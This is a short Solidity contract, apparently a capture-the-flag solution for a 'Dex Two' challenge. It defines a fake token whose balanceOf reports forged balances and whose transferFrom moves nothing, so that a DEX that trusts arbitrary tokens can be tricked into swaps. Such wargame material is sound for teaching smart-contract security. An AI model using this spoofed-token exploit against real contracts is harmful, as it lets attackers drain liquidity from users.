// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract DexTwoAttack {
    address public dex_contract;
    address public player;
    uint256 public tmp = 0;

    function set_addr(address _dex_contract, address _player) public {
        dex_contract = _dex_contract;
        player = _player;
    }

    function balanceOf(address _addr) external view returns (uint256) {
        if (_addr == player) {
            return 10000000000;
        } else if (_addr == dex_contract) {
            return 1;
        } else {
            return 0;
        }
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        tmp += 1;
    }
}